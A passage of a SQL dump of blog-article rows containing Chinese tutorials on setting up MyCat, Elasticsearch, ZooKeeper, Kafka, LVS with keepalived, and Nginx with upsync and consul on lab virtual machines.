by writeHost参与select语句的负载均衡，简单的说，当双主双从模式(M1->S1，M2->S2，并且M1与 M2互为主备)，正常情况下，M2,S1,S2都参与select语句的负载均衡；\n            2，所有的readHost与writeHost都参与select语句的负载均衡，也就是说，当系统的写操作压力不大的情况下，所有主机都可以承担负载均衡；\n-->\n    <dataHost name=\"localhost1\" maxCon=\"1000\" minCon=\"10\" balance=\"3\" writeType=\"0\" dbType=\"mysql\" dbDriver=\"native\" switchType=\"1\"  slaveThreshold=\"100\">\n        <heartbeat>select user()</heartbeat>\n        <!-- 可以配置多个主从 -->\n        <writeHost host=\"hostM1\" url=\"192.168.147.100:3306\" user=\"root\" password=\"1234\">\n            <!-- 可以配置多个从库 -->\n            <readHost host=\"hostS2\" url=\"192.168.147.101:3306\" user=\"root\" password=\"1234\" />\n        </writeHost>\n    </dataHost>\n</mycat:schema>\n```', 0, 0, 61, 0, 0, '2019-10-29 21:30:31', '2019-10-29 21:30:31', 0, 0);
INSERT INTO `article` VALUES (51, 1, 'elasticsearch单机与集群搭建', '2019/6/1559483105_116C1388F926CE0B140BF658D3271746.jpg', '### 单节点安装\n#### 修改/config/elasticsearch.yml\n![TIM截图20190601205415.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1559483816_TIM截图20190601205415.png)\n![TIM截图20190601210517.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1559483816_TIM截图20190601210517.png)\n![TIM截图20190601210420.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1559483816_TIM截图20190601210420.png)\n```c++\n// 1. 修改es目录的/config/elasticsearch.yml\nvi config/elasticsearch.yml\n// 修改内容\n// 修改为此es服务的服务器地址\nnetwork.host: 192.168.147.102\n// 删掉#注释,开放9200的http操作端口\nhttp.port: 9200\n```\n#### 修改/etc/sysctl.conf\n![TIM截图20190601212633.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1559483817_TIM截图20190601212633.png)\n```c++\n// 1. 修改/etc/sysctl.conf\nvi /etc/sysctl.conf\n// 添加内容\nvm.max_map_count=655360\n\n// 2. 让系统重新读取刷新配置文件\nsystctl -p\n```\n\n#### 修改/etc/security/limits.conf\n![TIM截图20190601214701.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1559483817_TIM截图20190601214701.png)\n![TIM截图20190601214423.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1559483817_TIM截图20190601214423.png)\n```c++\n// 1. 修改/etc/security/limits.conf\nvi /etc/security/limits.conf\n// 添加内容\n* soft nofile 65536\n* hard nofile 131072\n* soft nproc 2048\n* hard nproc 4096\n\n// 2. 重新启动服务器\nreboot\n```\n#### es启动错误root用户无法启动问题解决\n![TIM截图20190601211042.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1559483817_TIM截图20190601211042.png)\n![TIM截图20190601211908.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1559483817_TIM截图20190601211908.png)\n```c++\n// es不允许使用root用户进行启动\n// 需要创建一个系统用户进行启动\n\n// 1. 添加用户组\ngroupadd esusergroup\n\n// 2. 添加用户并将用户编入刚创建的用户组中\nuseradd tuwq -g esusergroup -p 123456\n\n// 3. 进入es上层目录\ncd /usr/local\n\n// 4. 将es目录操作权限赋予刚创建的用户\nchown -R tuwq:esusergroup elasticsearch-6.4.3\n```\n#### 启动es并检查是否启动成功\n![TIM截图20190601215906.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1559483817_TIM截图20190601215906.png)\n![TIM截图20190601215758.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1559483817_TIM截图20190601215758.png)\n```c++\n// 1. 进入es的bin目录\ncd bin/\n\n// 2. 关闭防火墙\nsystemctl stop firewalld\n\n// 3. 切换为刚创建的用户\nsu tuwq\n\n// 4. 启动es\n./elasticsearch\n\n// 5. 访问es检查是否启动成功\n192.168.147.102:9200\n```\n\n### 安装kibana\n#### 修改kibana目录的config/kibana.yml\n![TIM截图20190601220748.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1559483817_TIM截图20190601220748.png)\n![TIM截图20190601220645.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1559483817_TIM截图20190601220645.png)\n```c++\n// 1. 修改kibana目录的config/kibana.yml\nvi kibana.yml\n// 修改内容\n// kibana开放访问的端口\nserver.port: 5601\n// 本服务的服务器地址\nserver.host: \"192.168.147.102\"\n// es服务所在的服务地址\nelasticsearch.url: \"http://192.168.147.102:9200\"\n```\n\n#### 启动kibana并检查是否启动成功\n![TIM截图20190601224928.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1559483817_TIM截图20190601224928.png)\n![TIM截图20190601221030.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1559483817_TIM截图20190601221030.png)\n```c++\n// 1. 进入kibana的bin目录\ncd bin/\n\n// 2. 启动kibana\n./kibana\n\n// 3. 检查kibana是否启动成功\n192.168.147.102:5601\n```\n### 安装IK中文分词器\n![TIM截图20190602200020.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1559487218_TIM截图20190602200020.png)\n![TIM截图20190602200124.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1559487218_TIM截图20190602200124.png)\n```c++\n// 1. 将ik插件放入es的plugins目录中\nmv ik elasticsearch-6.4.3/plugins\n\n// 2. 切换用户启动es\nsu tuwq\n\n// 3. 启动es\n./elasticsearch\n\n// 4. 进入kibana检查ik中文分词器是否安装成功\nGET _cat/plugins\n```\n#### IK分词器如何添加字典\n![TIM截图20190602201119.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1559487218_TIM截图20190602201119.png)\n\n### 集群搭建\n![TIM截图20190603203200.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1559565180_TIM截图20190603203200.png)\n![TIM截图20190603201542.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1559565181_TIM截图20190603201542.png)\n![TIM截图20190603201711.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1559565181_TIM截图20190603201711.png)\n![TIM截图20190603202542.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1559565181_TIM截图20190603202542.png)\n```c++\n// 1. 修改config/elasticsearch.yml\nvi elasticsearch.yml\n// 修改内容\n// 集群名称,各节点必须一致\ncluster.name: my_cluster\n// 节点名称,各节点必须唯一,不能重复\nnode.name: node-1\n// 本节点的服务地址,各节点必须唯一,不能重复\nnetwork.host: 192.168.147.101\n// 参与集群的节点服务列表\ndiscovery.zen.ping.unicast.hosts: [\"192.168.147.101\", \"192.168.147.102\"]\n// 主节点个数1\ndiscovery.zen.minimum_master_nodes: 1\n```\n#### 克隆虚拟机导致es集群启动失败问题\n![TIM截图20190603204628.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1559566072_TIM截图20190603204628.png)\n```c++\n// 克隆虚拟机修改elasticsearch.yml配置文件启动报错\n// 原因可能是克隆的data目录有相同节点数据\n// 导致集群启动失败\n\n// 1. 删除data目录\nrm -rf data/\n```', 0, 0, 55, 0, 0, '2019-11-03 21:45:20', '2019-11-03 21:45:20', 0, 0);
INSERT INTO `article` VALUES (52, 1, 'zookeeper单机与集群搭建', '2019/6/1560002663_F1E29B8D8723F0C3AF86DE6BD4DAFD81.jpg', '### 单机版安装\n#### 修改conf/zoo.cfg\n![TIM截图20190604225914.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560003383_TIM截图20190604225914.png)\n```c++\n// 1. 进入conf目录\ncd conf\n\n// 2. 将zoo_sample.cfg更名为zoo.cfg\nmv zoo_sample.cfg zoo.cfg\n\n// 3. 修改zoo.cfg内容\nvi zoo.cfg\n// 修改dataDir目录位置\ndataDir=/usr/local/zookeeper/data \n```\n#### 配置环境变量\n![TIM截图20190608181308.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560003384_TIM截图20190608181308.png)\n![TIM截图20190608181146.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560003384_TIM截图20190608181146.png)\n```c++\n// 1. 添加zookeeper环境配置\nvi /etc/profile\n// 添加内容,根据自身服务安装情况调整\nexport JAVA_HOME=/usr/jdk/jdk1.8.0_191\nexport ZOOKEEPER_HOME=/usr/local/zookeeper\nexport CLASSPATH=.:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar\nexport PATH=$PATH:$ZOOKEEPER_HOME/bin:$JAVA_HOME/bin\n\n// 2. 系统重新读取/etc/profile\nsource /etc/profile\n```\n#### 启动zookeeper\n![TIM截图20190608172019.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560003383_TIM截图20190608172019.png)\n```c++\n// 1. 进入zookeeper目录创建data目录\ncd zookeeper\nmkdir data\n\n// 2. 进入bin目录\ncd bin\n\n// 3. 赋予zkServer.sh操作权限\nchmod 777 zkServer.sh\n\n// 4. 启动zookeeper\n./zkServer.sh start\n\n// 5. 查看zookeeper启动状态,出现Mode,说明启动成功\n./zkServer.sh status\n\n// 6. 关闭防火墙,使得允许外部访问\nsystemctl stop firewalld\n```\n\n### 集群安装\n#### 修改conf/zoo.cfg\n![TIM截图20190608174215.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560004278_TIM截图20190608174215.png)\n![TIM截图20190608174141.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560004278_TIM截图20190608174141.png)\n```c++\n// 1. 修改zoo.cfg文件\nvi zoo.cfg\n// 添加参与集群的节点信息\nserver.0=192.168.147.100:2888:3888\nserver.1=192.168.147.101:2888:3888\nserver.2=192.168.147.102:2888:3888\n```\n#### 创建节点id文件\n![TIM截图20190608174624.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560004278_TIM截图20190608174624.png)\n```c++\n// 1. 进入data目录\ncd data\n\n// 2. 创建myid文件 \nvi myid\n// 添加内容,根据该节点的id\n// 192.168.147.100 - 0\n// 192.168.147.101 - 1\n// 192.168.147.102 - 2\n```\n#### 启动检查集群是否成功\n![TIM截图20190608175542.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560004278_TIM截图20190608175542.png)\n```c++\n// 1. 进入bin目录\ncd bin\n\n// 2. 关闭防火墙,使得允许节点间及外部访问\nsystemctl stop firewalld\n\n// 3. 依次启动三台节点\n./zkServer.sh start\n\n// 4. 查看各节点的身份,应为一主两从\n./zkServer.sh status\n```\n\n#### 克隆虚拟机的问题\n![TIM截图20190608175934.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560004278_TIM截图20190608175934.png)\n```c++\n// 若是克隆的虚拟机,那么要删除data目录的zookeeper_server.pid,因为这会影响节点的唯一性\ncd data\nrm -rf zookeeper_server.pid\n```', 0, 0, 44, 0, 0, '2019-11-05 22:04:37', '2019-11-05 22:04:37', 0, 0);
INSERT INTO `article` VALUES (53, 1, 'kafka单机与集群搭建', '2019/6/1560005110_7A3610BB03BBCCD00B0EEA5C604FE831.jpg', '### 单机版安装\n#### 修改config/server.properties\n![TIM截图20190608195838.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560005280_TIM截图20190608195838.png)\n![TIM截图20190608210558.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560005280_TIM截图20190608210558.png)\n![TIM截图20190608195754.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560005279_TIM截图20190608195754.png)\n```c++\n// 1. 进入config目录\ncd config \n\n// 2. 修改server.properties\nvi server.properties\n// 修改内容\n// 节点的id,单机下随意\nbroker.id=0\n// kafka所依赖的协议,填写本服务器的服务地址信息\nlisteners=PLAINTEXT://192.168.147.100:9092\n// zookeeper的连接地址,zookeeper集群情况以逗号分隔填写\nzookeeper.connect=192.168.147.100:2181\n```\n\n#### 配置环境变量\n![TIM截图20190608205610.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560005280_TIM截图20190608205610.png)\n![TIM截图20190608205453.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560005280_TIM截图20190608205453.png)\n```c++\n// 1. 修改/etc/profile文件内容\nvi /etc/profile\n// 修改内容,根据自身服务安装情况调整\nexport JAVA_HOME=/usr/jdk/jdk1.8.0_191\nexport ZOOKEEPER_HOME=/usr/local/zookeeper\nexport KAFKA_HOME=/usr/local/kafka\nexport CLASSPATH=.:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar\nexport PATH=$PATH:$ZOOKEEPER_HOME/bin:$JAVA_HOME/bin:$KAFKA_HOME/bin \n\n// 2. 让系统重新读取/etc/profile\nsource /etc/profile\n```\n#### 启动kafka\n![TIM截图20190608210007.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560005280_TIM截图20190608210007.png)\n![TIM截图20190608210418.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560005280_TIM截图20190608210418.png)\n```c++\n// 1. 进入bin目录\ncd bin\n\n// 2. 关闭防火墙,使得允许外部访问\nsystemctl stop firewalld\n\n// 3. 指定配置文件启动kafka\n./kafka-server-start.sh -daemon ../config/server.properties\n\n// 4. 进入logs日志目录\ncd ../logs/\n\n// 5. 查看启动日志,检查kafka是否启动成功\ncat server.log\n```\n#### 检查kafka订阅主题功能\n![TIM截图20190608211211.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560005280_TIM截图20190608211211.png)\n```c++\n// 1. 进入bin目录\ncd bin\n\n// 2. 创建订阅主题\n./kafka-topics.sh --create --zookeeper 192.168.147.100:2181 --replication-factor 1 --partitions 1 --topic single-topic-test\n\n// 3. 查看刚刚创建的订阅主题,有信息说明订阅主题功能没问题\n./kafka-topics.sh --describe --zookeeper 192.168.147.100:2181 --topic single-topic-test\n```\n\n### 集群安装\n#### 修改config/server.properties\n![TIM截图20190608230711.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560006547_TIM截图20190608230711.png)\n![TIM截图20190608212409.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560006326_TIM截图20190608212409.png)\n![TIM截图20190608215818.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560006326_TIM截图20190608215818.png)\n```c++\n// 1. 修改config/server.properteis文件\nvi server.properteis\n// 修改内容\n// kafka各节点的id,各节点必须唯一,不允许重复\nbroker.id=1\n// 本服务节点的服务器地址信息\nlisteners=PLAINTEXT://192.168.147.100:9092\n// zookeeper连接地址,各节点必须填写一致,zookeepeer集群情况已逗号分隔\nzookeeper.connect=192.168.147.100:2181\n```\n#### 检查集群是否成功\n![TIM截图20190608214908.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560006326_TIM截图20190608214908.png)\n![TIM截图20190608215212.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560006326_TIM截图20190608215212.png)\n```c++\n// 1. 一个节点创建订阅主题\n./kafka-topics.sh --create --zookeeper 192.168.147.100:2181 --replication-factor 3 --partitions 1 --topic cluster-topic-test\n\n// 2. 其他节点查看订阅主题,能看到主题信息说明集群成功\n./kafka-topics.sh --describe --zookeeper 192.168.147.100:2181 --topic cluster-topic-test\n```', 0, 0, 58, 0, 0, '2019-11-07 22:45:14', '2019-11-07 22:45:14', 0, 0);
INSERT INTO `article` VALUES (54, 1, 'lvs+keepalive实现nginx双机热备', '2019/6/1560424443_0ae36a8a6d7c2f1348519469d03c8ed3.jpg', '### 搭建目标\n![Nginxlvs加keepalive搭建nginx双机热备.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1626683006_Nginx-lvs加keepalive搭建nginx双机热备.png)\n```java\n// lvs作用\n1. LVS是Linux Virtual Server的缩写，意思是Linux虚拟服务器。目前有三种IP负载均衡技术（VS/NAT、VS/TUN和VS/DR）；八种调度算法（rr,wrr,lc,wlc,lblc,lblcr,dh,sh）\n2. lvs可以实现传输层负载均衡,负载均衡技术齐全且高效率\n\n// keepalived作用\n1. keepalived是基于VRRP协议实现的保证集群高可用的一个服务软件，主要功能是实现真机的故障隔离和负载均衡器间的失败切换，防止单点故障\n2. LVS可以实现负载均衡，但是不能够进行健康检查，比如一个rs出现故障，LVS 仍然会把请求转发给故障的rs服务器，这样就会导致请求的无效性\n3. keepalive可以进行健康检查，而且能同时实现 LVS 的高可用性，解决 LVS 单点故障的问题\n\n// lvs与Nginx区别\n1. LVS基本能支持所有应用，因为工作在第4层，所以LVS可以对几乎所有应用进行负载均衡，包括Web、数据库等\n2. Nginx工作在网路第7层，所以可以对HTTP应用实施分流策略，比如域名、结构等。相比之下，LVS并不具备这样的功能，所以Nginx可使用的场合远多于LVS。并且Nginx对网络的依赖比较小，理论上只要Ping得通，网页访问正常就能连通。LVS比较依赖网络环境。只有使用DR模式且服务器在同一网段内分流，效果才能得到保证\n3. 如果是比较小型的网站（每日PV小于100万），用户Nginx就完全可以应对，如果机器也不少，可以用DNS轮询。\n4. LVS后用的机器较多，在构建大型网站或者提供重要服务且机器较多时，可多加考虑利用LVS。\n\n```\n### 检查LVS\n![TIM截图20190613130733.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560427401_TIM截图20190613130733.png)\n```c++\n// 查看linux内核版本,2.4及以上就自带lvs\nuname -r\n```\n\n### 安装keepalived\n![TIM截图20190613195304.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560426891_TIM截图20190613195304.png)\n![TIM截图20190613150641.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560426891_TIM截图20190613150641.png)\n![TIM截图20190613152425.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560426891_TIM截图20190613152425.png)\n![TIM截图20190613152503.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560426891_TIM截图20190613152503.png)\n![TIM截图20190613152559.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560426891_TIM截图20190613152559.png)\n![TIM截图20190613153434.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560426891_TIM截图20190613153434.png)\n```c++\n// 1. 安装依赖\nyum install -y openssl openssl-devel\nyum install popt-devel\nyum install gcc\n\n// 2. 下载并解压keepalived\nwget http://www.keepalived.org/software/keepalived-1.2.18.tar.gz\ntar -zxvf keepalived-1.2.18.tar.gz -C /usr/local/\n\n// 3. 编译并make\ncd /usr/local/keepalived-1.2.18/\n./configure --prefix=/usr/local/keepalived\nmake && make install\n\n// 4. 将keepalived安装成linux系统服务\nmkdir /etc/keepalived\ncp /usr/local/keepalived/etc/keepalived/keepalived.conf /etc/keepalived/\ncp /usr/local/keepalived/etc/rc.d/init.d/keepalived /etc/init.d/\ncp /usr/local/keepalived/etc/sysconfig/keepalived /etc/sysconfig/\nln -s /usr/local/sbin/keepalived /usr/sbin/\n\n// 这行将会报错,需要解决\nln -s /usr/local/keepalived/sbin/keepalived /sbin/\n// 解决办法\ncd /usr/sbin/ \nrm -f keepalived\ncp /usr/local/keepalived/sbin/keepalived  /usr/sbin/ \n\n// 5. 启动keepalive\nservice keepalived start\n```\n\n### 配置虚拟ip\n#### 编写keepalived的配置文件\n![TIM截图20190613201026.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560427891_TIM截图20190613201026.png)\n```c++\n! Configuration File for keepalived\n\nvrrp_script chk_nginx {\n    script \"/etc/keepalived/nginx_check.sh\" #运行脚本，脚本内容下面有，就是起到一个nginx宕机以后，自动开启服务\n    interval 2 #检测时间间隔\n    weight -20 #如果条件成立的话，则权重 -20\n}\n# 定义虚拟路由，VI_1 为虚拟路由的标示符，自己定义名称\nvrrp_instance VI_1 {\n    ###MASTER 主的意思  BACKUP 从\n    state MASTER #来决定主从\n    interface ens33 # 绑定虚拟 IP 的网络接口，根据自己的机器填写,输入ip addr可查看\n    virtual_router_id 110 # 虚拟路由的 ID 号， 两个节点设置必须一样\n    mcast_src_ip 192.168.147.101 #填写本机ip\n    priority 100 # 节点优先级,主节点要比从节点优先级高\n    nopreempt # 优先级高的设置 nopreempt 解决异常恢复后再次抢占的问题\n    advert_int 1 # 组播信息发送间隔，两个节点设置必须一样，默认 1s\n    authentication {\n        auth_type PASS\n        auth_pass 1111\n    }\n    # 将 track_script 块加入 instance 配置块\n    track_script {\n        chk_nginx #执行 Nginx 监控的服务\n    }\n    ### 虚拟IP地址配置规范 假设192.168.147.201 \n    virtual_ipaddress {\n        192.168.147.200 # 虚拟ip,也就是解决写死程序的ip怎么能切换的ip,也可扩展，用途广泛。可配置多个。\n    }\n}\n```\n#### 发现宕机自动重启nginx脚本\n```c++\n#!/bin/bash\nA=`ps -C nginx ¨Cno-header |wc -l`\nif [ $A -eq 0 ];then\n    /usr/local/nginx/sbin/nginx\n    sleep 2\n    if [ `ps -C nginx --no-header |wc -l` -eq 0 ];then\n        killall keepalived\n    fi\nfi\n```\n#### 启动keepalived检查虚拟ip是否配置成功\n![TIM截图20190613165441.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560427937_TIM截图20190613165441.png)\n```java\n1. 打开nginx,发现既可以使用真实ip,也可以使用虚拟ip进行访问,说明配置成功\n\n```\n\n\n\n### 配置Nginx主从热备\n#### 主节点配置\n```c++\n! Configuration File for keepalived\n\nvrrp_script chk_nginx {\n    script \"/etc/keepalived/nginx_check.sh\" #运行脚本，脚本内容下面有，就是起到一个nginx宕机以后，自动开启服务\n    interval 2 #检测时间间隔\n    weight -20 #如果条件成立的话，则权重 -20\n}\n# 定义虚拟路由，VI_1 为虚拟路由的标示符，自己定义名称\nvrrp_instance VI_1 {\n    ###MASTER 主的意思  BACKUP 从\n    state MASTER #来决定主从\n    interface ens33 # 绑定虚拟 IP 的网络接口，根据自己的机器填写,输入ip addr可查看\n    virtual_router_id 110 # 虚拟路由的 ID 号， 两个节点设置必须一样\n    mcast_src_ip 192.168.147.101 #填写本机ip\n    priority 100 # 节点优先级,主节点要比从节点优先级高\n    nopreempt # 优先级高的设置 nopreempt 解决异常恢复后再次抢占的问题\n    advert_int 1 # 组播信息发送间隔，两个节点设置必须一样，默认 1s\n    authentication {\n        auth_type PASS\n        auth_pass 1111\n    }\n    # 将 track_script 块加入 instance 配置块\n    track_script {\n        chk_nginx #执行 Nginx 监控的服务\n    }\n    ### 虚拟IP地址配置规范 假设192.168.147.201 \n    virtual_ipaddress {\n        192.168.147.200 # 虚拟ip,也就是解决写死程序的ip怎么能切换的ip,也可扩展，用途广泛。可配置多个。\n    }\n}\n```\n#### 从节点配置\n```c++\n ! Configuration File for keepalived\n\nvrrp_script chk_nginx {\n    script \"/etc/keepalived/nginx_check.sh\" #运行脚本，脚本内容下面有，就是起到一个nginx宕机以后，自动开启服务\n    interval 2 #检测时间间隔\n    weight -20 #如果条件成立的话，则权重 -20\n}\n# 定义虚拟路由，VI_1 为虚拟路由的标示符，自己定义名称\nvrrp_instance VI_1 {\n    ###MASTER 主的意思  BACKUP 从\n    state BACKUP #来决定主从\n    interface ens33 # 绑定虚拟 IP 的网络接口，根据自己的机器填写,输入ip addr可查看\n    virtual_router_id 110 # 虚拟路由的 ID 号， 两个节点设置必须一样\n    mcast_src_ip 192.168.147.102 #填写本机ip\n    priority 100 # 节点优先级,主节点要比从节点优先级高\n    nopreempt # 优先级高的设置 nopreempt 解决异常恢复后再次抢占的问题\n    advert_int 1 # 组播信息发送间隔，两个节点设置必须一样，默认 1s\n    authentication {\n        auth_type PASS\n        auth_pass 1111\n    }\n    # 将 track_script 块加入 instance 配置块\n    track_script {\n        chk_nginx #执行 Nginx 监控的服务\n    }\n    ### 虚拟IP地址配置规范 假设192.168.147.201 \n    virtual_ipaddress {\n        192.168.147.200 # 虚拟ip,也就是解决写死程序的ip怎么能切换的ip,也可扩展，用途广泛。可配置多个。\n    }\n}\n```\n\n#### 验证是否成功\n```java\n1. 访问192.168.147.200,lvs将会选择主节点101的nginx\n2. 当主节点的keepalived宕机情况下,lvs将会选择从节点102\n3. 当主节点重启后,lvs将会重新选择至主节点101\n\n```', 0, 0, 43, 0, 0, '2019-11-08 19:15:07', '2019-11-08 19:15:07', 0, 0);
INSERT INTO `article` VALUES (55, 1, 'upsync+consul实现nginx动态配置负载均衡', '2019/6/1560496896_183E12220D00015175EAF9EC906CC129.jpg', '### 搭建目标\n![Nginxupsync加consul实现动态负载均衡配置.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1626683319_Nginx-upsync加consul实现动态负载均衡配置.png)\n```java\n1. upsync用以实现动态负载均衡,使得实时读取consul中的负载均衡配置\n2. 使得nginx无需更改配置文件后再重启\n3. consul作用为配置中心,与euraka,zookeeper相似,它也可以作用于分布式的服务发现注册中心\n\n```\n### 安装consul\n![TIM截图20190613232200.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560497373_TIM截图20190613232200.png)\n![TIM截图20190613232658.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560497373_TIM截图20190613232658.png)\n![TIM截图20190613232919.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560497373_TIM截图20190613232919.png)\n```c++\n// 1. 下载consul,慢的话手动下载后放入目录\nwget https://releases.hashicorp.com/consul/0.7.5/consul_0.7.5_linux_amd64.zip\n\n// 2. 下载zip解压依赖\nyum -y install unzip\n\n// 3. 解压consul\nunzip consul_0.7.5_linux_amd64.zip\n\n// 4. 关闭防火墙\nsystemctl stop firewalld\n\n// 5. 启动consul\n./consul agent -dev -ui -node=consul-dev -client=192.168.147.101\n\n// 6. 访问检查consul是否启动成功\nhttp://192.168.147.101:8500\n```\n\n### 安装upsync\n![TIM截图20190614130520.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560497373_TIM截图20190614130520.png)\n![TIM截图20190614130819.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560497373_TIM截图20190614130819.png)\n![TIM截图20190614133022.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560497373_TIM截图20190614133022.png)\n![TIM截图20190614133633.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560497373_TIM截图20190614133633.png)\n![TIM截图20190614134118.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560497373_TIM截图20190614134118.png)\n```c++\n// 1. 删除原先的已编译并make的nginx,如果之前有的话\nrm -rf /usr/local/nginx\n\n// 2. 下载upsync\nwget https://github.com/weibocom/nginx-upsync-module/archive/master.zip\n\n// 3. 解压upsync\nunzip master.zip \n\n// 4. 创建一些upsync所需要的目录及用户配置信息\ngroupadd nginx\nuseradd -g nginx -s /sbin/nologin nginx\nmkdir -p /var/tmp/nginx/client/\nmkdir -p /usr/local/nginx\n\n// 5. 进入nginx编译解压包\ncd /usr/local/nginx-1.12.0\n\n// 6. 开始编译nginx,注意upsync模块路径是否正确\n./configure   --prefix=/usr/local/nginx   --user=nginx   --group=nginx   --with-http_ssl_module   --with-http_flv_module   --with-http_stub_status_module   --with-http_gzip_static_module   --with-http_realip_module   --http-client-body-temp-path=/var/tmp/nginx/client/   --http-proxy-temp-path=/var/tmp/nginx/proxy/   --http-fastcgi-temp-path=/var/tmp/nginx/fcgi/   --http-uwsgi-temp-path=/var/tmp/nginx/uwsgi   --http-scgi-temp-path=/var/tmp/nginx/scgi   --with-pcre --add-module=../nginx-upsync-module-master\n\n// 7. 编译成功后进行make,编译成功后可以启动nginx检查一下是否正常运行\nmake && make install\n```\n\n### 配置nginx读取consul的配置\n![TIM截图20190614145139.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560497373_TIM截图20190614145139.png)\n![TIM截图20190614150044.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560497373_TIM截图20190614150044.png)\n![TIM截图20190614150408.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560497373_TIM截图20190614150408.png)\n```c++\n// 1. 修改nginx.conf配置内容,添加upsync相关内容,具体内容在下面\nvi nginx.conf\n\n// 2. 创建upsync所需持久化存储配置信息的目录\nmkdir /usr/local/nginx/conf/servers/\n\n// 3. 进入sbin目录启动nginx\ncd sbin\n./nginx\n\n// 4. 添加负载均衡信息至consul,使得upsync可读取到\n// consul地址和负载均衡目标服务地址\ncurl -X PUT http://192.168.147.101:8500/v1/kv/upstreams/test/192.168.147.101:8081\ncurl -X PUT http://192.168.147.101:8500/v1/kv/upstreams/test/192.168.147.101:8082\n\n// 5. 关闭防火墙\nsystemctl stop firewalld\n\n// 6. 在8081和8082启动两个应用服务后,访问nginx,查看nginx是否启动成功,upsync是否奏效\nhttp://192.168.147.101\n```\n#### nginx.conf内容\n```c++\n# /usr/local/nginx/conf/nginx.conf\n#user  nobody;\nworker_processes  1;\n\n#error_log  logs/error.log;\n#error_log  logs/error.log  notice;\n#error_log  logs/error.log  info;\n\n#pid        logs/nginx.pid;\n\n\nevents {\n    worker_connections  1024;\n}\n\n\nhttp {\n    include       mime.types;\n    default_type  application/octet-stream;\n\n    #log_format  main  \'$remote_addr - $remote_user [$time_local] \"$request\" \'\n    #                  \'$status $body_bytes_sent \"$http_referer\" \'\n    #                  \'\"$http_user_agent\" \"$http_x_forwarded_for\"\'\n    #          \'$upstream_addr $upstream_status $upstream_response_time $request_time\';\n\n    #access_log  logs/access.log  main;\n\n    sendfile        on;\n    #tcp_nopush     on;\n\n    #keepalive_timeout  0;\n    keepalive_timeout  65;\n\n    #gzip  on;\n    #\n    #vhost_traffic_status_zone;\n    #proxy_cache_path /tmp/cache_backend keys_zone=cache_backend:10m;\n\n    upstream test {\n    	## upsync所需的监听\n        server 127.0.0.1:11111; \n        ## 连接consulServer,获取动态的配置信息\n        upsync 192.168.147.101:8500/v1/kv/upstreams/test upsync_timeout=6m upsync_interval=500ms upsync_type=consul strong_dependency=off;\n        ### 动态拉取consulServer相关负载均衡信息持久化在硬盘上,需要创建\n        upsync_dump_path /usr/local/nginx/conf/servers/servers_test.conf;\n    }\n\n    server {\n        listen 80;\n        server_name localhost;\n\n        location / {\n            proxy_pass http://test;\n            index index.html index.htm;\n        }\n\n    }\n}\n\n\n```', 0, 0, 37, 0, 0, '2019-11-08 15:21:44', '2019-11-08 15:21:44', 0, 0);
